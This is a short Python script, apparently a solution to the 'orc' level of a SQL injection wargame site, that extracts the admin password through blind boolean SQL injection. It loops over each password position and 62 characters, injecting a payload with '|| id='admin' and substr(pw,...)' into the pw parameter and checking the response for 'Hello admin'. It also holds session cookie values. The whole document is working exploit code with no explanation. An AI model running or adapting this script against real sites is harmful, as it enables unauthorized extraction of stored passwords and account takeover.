# python 3.5.2
import urllib.request
MyHeader = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
'Accept-Encoding': 'none',
'Accept-Language': 'en-US,en;q=0.8',
'Connection': 'keep-alive'}
#MyCookies = {'PHPSESSID': '68jotprn1p8enuiqjd12ahvgs7','_cfduid':'db874ed463a1dda475cbf0410b0e3f66c1494392708'}
length=8
pw=""
arr="1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
for i in range(1,9):
	for j in range(0,62):
		url="http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=*' || id='admin' and substr(pw,{0},1)='{ascii}' %23".format(i,ascii=arr[j])
		r = urllib.request.Request(url,headers=MyHeader)
		r.add_header("Cookie","PHPSESSID=oa8na5v7q0h6m8dqu80mjmmsj5")
		data = urllib.request.urlopen(r).read().decode("utf-8")
		print(url)
		if data.find("Hello admin") != -1 :
			pw = pw + arr[j]
			print("This is    "+arr[j])
			break
print(pw)